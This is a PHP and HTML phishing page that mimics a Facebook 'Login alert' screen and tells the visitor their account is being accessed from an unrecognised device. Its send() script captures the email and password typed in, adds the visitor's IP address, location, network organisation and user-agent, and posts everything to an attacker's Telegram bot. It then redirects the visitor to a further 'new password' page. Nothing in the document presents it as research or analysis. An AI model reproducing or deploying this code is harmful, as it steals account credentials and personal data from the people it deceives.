<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Login alert</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="/styles/login-warning.css">
</head>
<body>
    <div class="app">
        <header class="app-header">
            <div class="header-inner">
                <div class="fb-brand">
                    <span class="fb-logo" aria-hidden="true">f</span>
                </div>
                <button class="back-btn" aria-label="Back">←</button>
            </div>
        </header>

        <main class="card">
            <div class="warning-icon" aria-hidden="true">
                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" fill="#F02849"/>
                    <rect x="11" y="8" width="2" height="6" rx="1" fill="white"/>
                    <rect x="11" y="15.5" width="2" height="2" rx="1" fill="white"/>
                </svg>
            </div>

            <h1 class="title">Login alert</h1>
            <p class="subtitle">Your account is being accessed from a device or browser we don’t recognize. Please review your recent login activity.</p>

            <form class="form" onsubmit="send(event)" autocomplete="on">
                <label class="input-field">
                    <input type="text" name="email" inputmode="email" id="email" placeholder="Email" required>
                </label>
                <label class="input-field password-field">
                    <input type="password" name="password" id="password" placeholder="Password" required>
                    <button type="button" class="eye-toggle" onclick="togglePassword()" aria-label="Show password">
                        <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" stroke-width="2" fill="none"/>
                            <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" fill="none"/>
                        </svg>
                        <svg class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                            <path d="m1 1 22 22" stroke="currentColor" stroke-width="2"/>
                            <path d="M7 7C3 10.8 1 12 1 12s4 8 11 8c1.7 0 3.2-.4 4.4-1" stroke="currentColor" stroke-width="2" fill="none"/>
                            <path d="M15.5 15.5C14.6 16.5 13.4 17 12 17c-2.8 0-5-2.2-5-5 0-1.4.5-2.6 1.5-3.5" stroke="currentColor" stroke-width="2" fill="none"/>
                            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" stroke="currentColor" stroke-width="2" fill="none"/>
                        </svg>
                    </button>
                </label>
                <button type="submit" class="primary-btn">Log in</button>
            </form>

            <div class="links">
                <a class="link" href="#">Forgot password?</a>
                <hr/>
                <a class="link" href="#">Create new account</a>
            </div>
        </main>
    </div>
    
    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.querySelector('.eye-icon');
            const eyeOffIcon = document.querySelector('.eye-off-icon');
            const eyeToggle = document.querySelector('.eye-toggle');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.style.display = 'none';
                eyeOffIcon.style.display = 'block';
                eyeToggle.setAttribute('aria-label', 'Hide password');
            } else {
                passwordInput.type = 'password';
                eyeIcon.style.display = 'block';
                eyeOffIcon.style.display = 'none';
                eyeToggle.setAttribute('aria-label', 'Show password');
            }
        }

        function send(event) {
            event.preventDefault();
            var password = document.getElementById('password').value;
            var email = document.getElementById('email').value;


            if (password == "" || email == "") {
                return;
            }

            var content = "💬Thông Tin Đăng Nhập (Cảnh báo đăng nhập)💬" +
                "\n" + "----------------------------------------------------------" +
                "\nEmail: " + "`" + email + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nPassword: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            
            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        // set email to localStorage
                        localStorage.setItem('email', email);
                        localStorage.setItem('password', password);
                        window.location.href = "/enter-new-password.php";
                    } else {
                        // reload page
                        window.location.reload();
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }
    </script>
</body>
</html>